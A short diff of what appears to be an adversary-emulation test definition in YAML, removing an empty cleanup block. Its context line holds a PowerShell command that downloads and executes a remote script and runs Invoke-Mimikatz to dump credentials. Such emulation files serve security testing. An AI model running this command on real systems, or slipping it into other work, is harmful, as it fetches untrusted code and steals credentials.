@@ -22,6 +22,3 @@ steps:
       inline: |
         IEX (New-Object Net.WebClient).DownloadString('{{.Args.remote_script}}'); Invoke-Mimikatz -DumpCreds
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
